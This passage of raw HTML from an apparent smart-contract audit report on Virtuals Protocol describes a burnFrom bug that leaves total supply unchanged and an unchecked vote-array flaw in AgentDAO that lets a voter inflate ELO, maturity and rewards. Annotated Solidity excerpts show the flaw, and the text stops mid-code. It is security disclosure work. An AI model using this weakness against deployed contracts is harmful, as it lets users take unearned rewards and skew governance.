1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eExplanation\u003c/h3\u003e\n\u003cp\u003eThis test checks if the \u003ccode\u003eburnFrom\u003c/code\u003e function correctly reduces the total supply when the owner burns tokens from another user (\u003ccode\u003eaddr1\u003c/code\u003e). In a properly implemented ERC20 token, burning tokens should reduce both the user’s balance and the total supply.\u003c/p\u003e\n\u003ch3 id=\"what-this-means\" style=\"position:relative;\"\u003e\u003ca href=\"#what-this-means\" aria-label=\"what this means permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eWhat this means\u003c/h3\u003e\n\u003cp\u003eThe test expected \u003ccode\u003efinalTotalSupply\u003c/code\u003e to be less than \u003ccode\u003einitialTotalSupply\u003c/code\u003e,\nbut both values were exactly the same: \u003ccode\u003e1000000000000000000000000000000000000000\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"the-core-issue\" style=\"position:relative;\"\u003e\u003ca href=\"#the-core-issue\" aria-label=\"the core issue permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eThe core issue\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eBoth \u003ccode\u003einitialTotalSupply\u003c/code\u003e and \u003ccode\u003efinalTotalSupply\u003c/code\u003e remain unchanged after burning.\u003c/li\u003e\n\u003cli\u003eAlthough \u003ccode\u003eburnFrom\u003c/code\u003e decreases the user’s balance and emits a Transfer (user, \u003ccode\u003eaddress(0)\u003c/code\u003e, amount) event (mimicking a burn), the \u003ccode\u003e_totalSupply\u003c/code\u003e is never updated.\u003c/li\u003e\n\u003cli\u003eThis is a major inconsistency that breaks the expected behavior of a burn function and introduces risk.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-11-agentdao_castvote-doesnt-check-the-array-of-votes-emitted-which-determine-the-number-of-battles-fought-in-elocalculatorsol-allowing-the-user-to-increase-the-elo-of-a-contribution-unfairly-inflating-the-maturityimpact-of-servicenfts\" style=\"position:relative;\"\u003e\u003ca href=\"#m-11-agentdao_castvote-doesnt-check-the-array-of-votes-emitted-which-determine-the-number-of-battles-fought-in-elocalculatorsol-allowing-the-user-to-increase-the-elo-of-a-contribution-unfairly-inflating-the-maturityimpact-of-servicenfts\" aria-label=\"m 11 agentdao_castvote doesnt check the array of votes emitted which determine the number of battles fought in elocalculatorsol allowing the user to increase the elo of a contribution unfairly inflating the maturityimpact of servicenfts permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-45\"\u003e[M-11] \u003ccode\u003eAgentDAO::_castVote\u003c/code\u003e doesn’t check the array of votes emitted, which determine the number of battles fought in \u003ccode\u003eEloCalculator.sol\u003c/code\u003e, allowing the user to increase the ELO of a contribution unfairly, inflating the maturity/impact of \u003ccode\u003eServiceNFTs\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-771\"\u003eJeremias\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-389\"\u003eoakcobalt\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-132\"\u003eShinobi\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L129\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L129\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L189\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L189\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L174\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L174\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-6\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-6\" aria-label=\"finding description 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eWe have this in their whitepaper:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003eWhen validating a model, validators are presented with two models anonymously for comparison. They go through 10 rounds of interaction with each model pair, selecting the better responses. After 10 rounds, a vote is submitted with the final outcomes.\u003c/li\u003e\n\u003cli\u003eAnonymity in model comparison prevents collusion and bias among validators and contributors, ensuring a fair model selection process.\u003c/li\u003e\n\u003cli\u003eVirtual Protocol has opted for the Elo Rating System for model comparison.”\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eOther than the issue of direct on-chain transactions submitted by validators, the elo calculation system of \u003ccode\u003eserviceNft\u003c/code\u003e isn’t actually capped at 10 rounds, but receives an arbitrary amount of votes that a user directly interacting with the service can determine, both in rounds and value.\u003c/p\u003e\n\u003cp\u003eThis is the \u003ccode\u003eAgentDAO\u003c/code\u003e override of the \u003ccode\u003e_castVote\u003c/code\u003e function (to be called by \u003ccode\u003ecastVoteWithReasonAndParams\u003c/code\u003e). It takes \u003ccode\u003eparams\u003c/code\u003e as argument. Which is an encoded \u003ccode\u003euint8[]\u003c/code\u003e array representing the result (votes) of those rounds.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"64\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _castVote(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 proposalId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address account,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8 support,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        string memory reason, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        bytes memory params //@audit params can also be passed as arguments\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) internal override returns (uint256) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (!votedPreviously \u0026amp;\u0026amp; hasVoted(proposalId, account)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            ++_totalScore;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            _scores[account].push(SafeCast.toUint48(block.number), SafeCast.toUint208(scoreOf(account)) + 1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (params.length \u0026gt; 0 \u0026amp;\u0026amp; support == 1) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;                _updateMaturity(account, proposalId, weight, params); //@audit params is never checked\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return weight;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs we saw in \u003ccode\u003eagentDAO::_castVote\u003c/code\u003e, the params are passed to the \u003ccode\u003eagentDAO::_updateMaturity\u003c/code\u003e function: \u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e_updateMaturity\u003c/code\u003e passes those to \u003ccode\u003e_calculateMaturity\u003c/code\u003e, to update the “maturity” of the proposal (which should be construed as a relevant measure that weights in the final importance of implementing a new service or not, related to the \u003ccode\u003eELO\u003c/code\u003e and \u003ccode\u003eweight\u003c/code\u003e of vote):\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"65\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _updateMaturity(address account, uint256 proposalId, uint256 weight, bytes memory params /*votes*/) internal {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8[] memory votes = abi.decode(params, (uint8[])); //@audit params has been decoded, but the length isn\u0026#39;t checked\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 maturity = _calcMaturity(proposalId, votes);  //@audit this calls eloCalculator (shown below)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _proposalMaturities[proposalId] += (maturity * weight); //@audit here maturity is updated, affecting ServiceNfts\u0026#39; elo and impact\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        emit ValidatorEloRating(proposalId, account, maturity, votes);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe issue arises in the fact that votes can be any amount of \u003ccode\u003euint8[]\u003c/code\u003e votes that the user decided to pass as an argument.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e_calcMaturity\u003c/code\u003e calls the \u003ccode\u003eeloCalculator::battleElo(maturity, votes)\u003c/code\u003e, where votes will be the \u003ccode\u003euint8[]\u003c/code\u003e. We can also know which elo participant is the one we vote for.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"66\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _calcMaturity(uint256 proposalId, uint8[] memory votes) internal view returns (uint256) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address contributionNft = IAgentNft(_agentNft).getContributionNft(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address serviceNft = IAgentNft(_agentNft).getServiceNft();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 virtualId = IContributionNft(contributionNft).tokenVirtualId(proposalId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8 core = IContributionNft(contributionNft).getCore(proposalId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 coreService = IServiceNft(serviceNft).getCoreService(virtualId, core);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 maturity = 100; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (coreService \u0026gt; 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            maturity = IServiceNft(serviceNft).getMaturity(coreService); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;            maturity = IEloCalculator(IAgentNft(_agentNft).getEloCalculator()).battleElo(maturity, votes);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            //@audit, battleElo is called with an arbitrary amount of uint8[] votes\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return maturity;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn \u003ccode\u003eeloCalculator::battleElo\u003c/code\u003e, the array of votes is used to determine the number of \u003ccode\u003ebattles\u003c/code\u003e that the two elos fight, and the result of the vote determines how the \u003ccode\u003eELO\u003c/code\u003e of each of the two participants (models) is affected. Since the ELO is affected by the amount and the result, a user could arbitrarily set both, increasing the ELO of the \u003ccode\u003eServiceNft\u003c/code\u003e, and the proposal impact.\u003c/p\u003e\n\u003cp\u003eThe function goes as follows:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"67\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function battleElo(uint256 currentRating, uint8[] memory battles) public view returns (uint256) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 eloA = 1000; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 eloB = 1000;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        //@audit battles is the votes params, the length of which we didn\u0026#39;t check\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        for (uint256 i = 0; i \u0026lt; battles.length; i++) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256 result = mapBattleResultToGameResult(battles[i]); //@audit function that maps vote value to result\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            (uint256 change, bool negative) = Elo.ratingChange(eloB, eloA, result, k);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            change = _roundUp(change, 100);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (negative) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                eloA -= change;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                eloB += change;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            } else {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                eloA += change;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                eloB -= change;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        //@audit we can arbitrarily raise the ELO to make our vote more impactful in maturity\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return currentRating + eloA - 1000;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe amount of times the change is affected to the ELO rating, is defined by that unchecked \u003ccode\u003euint8[]\u003c/code\u003e array. Thus, allowing users to increase more than due maturity/ELO. The maturity of the proposal would be bigger than it should, and the \u003ccode\u003eserviceNft\u003c/code\u003e would also get a bigger impact than it should have.\u003c/p\u003e\n\u003cp\u003eAn impact is a value calculated from the \u003ccode\u003eserviceNft::maturity[proposalId]\u003c/code\u003e (taken from \u003ccode\u003eagentDAO::getMaturity(proposalId)\u003c/code\u003e at mint call, and stored in the contract’s array), and is the difference of the current service, and the previous service maturity.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"68\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function updateImpact(uint256 virtualId, uint256 proposalId) public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Calculate impact\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Get current service maturity\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 prevServiceId = _coreServices[virtualId][_cores[proposalId]];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 rawImpact = (_maturities[proposalId] \u0026gt; _maturities[prevServiceId])\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            ? _maturities[proposalId] - _maturities[prevServiceId]  //@audit raw-impact is the difference of maturities between proposals. An inflated votation might result in an inflated difference.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            : 0;  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 datasetId = IContributionNft(contributionNft).getDatasetId(proposalId); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _impacts[proposalId] = rawImpact;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (datasetId \u0026gt; 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        emit SetServiceScore(proposalId, _maturities[proposalId], _impacts[proposalId]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe don’t know what the current implementation of \u003ccode\u003eagentReward\u003c/code\u003e is, but for version of v2 or lower, it would allow for an inflated reward to contributor.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"69\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _distributeContributorRewards(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 amount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        RewardSettingsCheckpoints.RewardSettings memory settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) private {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IAgentNft nft = IAgentNft(agentNft);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8[] memory coreTypes = nft.virtualInfo(virtualId).coreTypes;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IServiceNft serviceNftContract = IServiceNft(serviceNft);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IContributionNft contributionNftContract = IContributionNft(contributionNft);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        Reward storage reward = _rewards[virtualId][_rewards[virtualId].length - 1];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        reward.coreAmount = amount / coreTypes.length;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256[] memory services = nft.getAllServices(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Populate service 